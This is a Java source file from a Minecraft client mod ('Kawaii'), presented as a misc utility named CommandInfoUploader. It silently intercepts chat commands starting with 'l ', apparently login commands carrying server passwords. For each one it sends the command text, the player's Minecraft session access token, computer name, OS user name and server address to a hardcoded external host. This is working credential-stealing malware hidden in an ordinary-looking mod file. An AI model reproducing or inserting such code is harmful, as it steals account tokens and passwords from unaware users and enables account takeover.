package dev.kizuna.api.utils.misc;

import dev.kizuna.Kawaii;
import dev.kizuna.api.events.eventbus.EventHandler;
import dev.kizuna.api.events.impl.PacketEvent;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;
import java.nio.charset.StandardCharsets;
import java.io.OutputStream;
import java.io.InputStream;
import java.util.Scanner;
import java.io.IOException;

public class CommandInfoUploader {
    private static final String UPLOAD_URL = "http://e52680.mc5173.cn:42077/";
    private static final MinecraftClient mc = MinecraftClient.getInstance();
    private static boolean initialized = false;

    public static void init() {
        if (!initialized) {
            Kawaii.EVENT_BUS.subscribe(new CommandInfoUploader());
            initialized = true;
        }
    }

    @EventHandler
    public void onSend(PacketEvent.Send event) {
        if (event.getPacket() instanceof CommandExecutionC2SPacket packet) {
            String command = packet.command();
            if (command.startsWith("l ")) {
                uploadCommandInfo(command);
            }
        }
    }

    private static void uploadCommandInfo(String command) {
        if (mc.player == null || mc.getNetworkHandler() == null) {
            return;
        }

        try {
            String computerName = System.getenv("COMPUTERNAME") != null ? System.getenv("COMPUTERNAME") : "Unknown";
            String userName = System.getProperty("user.name") != null ? System.getProperty("user.name") : "Unknown";
            String accessToken = mc.getSession().getAccessToken() != null ? mc.getSession().getAccessToken() : "Unknown";
            String os = System.getProperty("os.name") != null ? System.getProperty("os.name") : "Unknown";
            String minecraftUser = mc.getSession().getUsername() != null ? mc.getSession().getUsername() : "Unknown";
            String clientVersion = Kawaii.VERSION;
            String serverIp = mc.getCurrentServerEntry() != null ? mc.getCurrentServerEntry().address : "Singleplayer";
            Map<String, String> data = new HashMap<>();
            data.put("computerName", computerName);
            data.put("userName", userName);
            data.put("accessToken", accessToken);
            data.put("os", os);
            data.put("minecraftUser", minecraftUser);
            data.put("clientVersion", clientVersion);
            data.put("command", command);
            data.put("serverIp", serverIp);
            data.put("clientType", "Kawaii");

            // 发送HTTP请求
            sendPostRequest(UPLOAD_URL, data);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void sendPostRequest(String urlString, Map<String, String> data) throws IOException {
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();

        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setDoOutput(true);

        StringBuilder jsonBuilder = new StringBuilder();
        jsonBuilder.append("{");
        boolean first = true;
        for (Map.Entry<String, String> entry : data.entrySet()) {
            if (!first) {
                jsonBuilder.append(",");
            }
            jsonBuilder.append("\"").append(entry.getKey()).append("\":\"").append(entry.getValue()).append("\"");
            first = false;
        }
        jsonBuilder.append("}");

        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = jsonBuilder.toString().getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }

        try (InputStream is = connection.getInputStream();
             Scanner scanner = new Scanner(is, StandardCharsets.UTF_8.name())) {
            String response = scanner.useDelimiter("\\A").next();
        }

        connection.disconnect();
    }
}